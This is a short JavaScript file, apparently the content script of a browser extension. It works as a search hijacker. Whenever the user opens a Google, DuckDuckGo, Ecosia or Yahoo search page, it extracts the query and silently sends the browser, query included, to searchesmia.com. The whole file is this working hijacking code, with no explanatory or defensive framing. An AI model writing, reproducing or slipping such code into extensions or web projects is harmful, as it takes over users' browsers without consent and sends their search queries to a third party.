var currentUrl = document.URL;
function checkUrlIsSearchEngine(url) {
    // var hostName = getHost(url)
    if (url.match(/^https?:.*?google.*?\/search?/g) != null) {
        var searchQuery = getQuery(url);
        location.replace(`https://searchesmia.com/bingchr5?q=${searchQuery}`)
    }
    if (url.match(/^https?:.*?duckduckgo.*?\/?q=/g) != null) {
        var searchQuery = getQuery(url);
        location.replace(`https://searchesmia.com/bingchr5?q=${searchQuery}`)
    }
    if (url.match(/^https?:.*?ecosia.*?\/?search?/g) != null) {
        var searchQuery = getQuery(url);
        location.replace(`https://searchesmia.com/bingchr5?q=${searchQuery}`)
    }
    if (url.match(/^https?:.*?yahoo.*?\/?search?/g) != null) {
        var searchQuery = getQuery(url, 'yahoo');
        location.replace(`https://searchesmia.com/bingchr5?q=${searchQuery}`)
    }
}

function isRedirected(url) {
    if (url.indexOf('https://searchesmia.com/') != -1) {
        return true
    } else {
        return false
    }
}

function getQuery(search, type = '') {
    var pattern = type == 'yahoo' ? /[\?\&]p=(.*)&?/ : /[\?\&]q=(.*)&?/
    var result = pattern.exec(search) != null ? pattern.exec(search)[1] : ''
    var str = result
    if (type != 'yahoo') {
        str = result.split('&')[0] || ''
    }
    return str
}

function getHost(url) {
    var re = new RegExp('^(?:f|ht)tp(?:s)?\://([^/]+)', 'im'),
        m;
    if (url != null) {
        m = url.match(re);
        if (m != null) {
            return m[0];
        }
    }
    return url;
}

!isRedirected(currentUrl) && checkUrlIsSearchEngine(currentUrl);
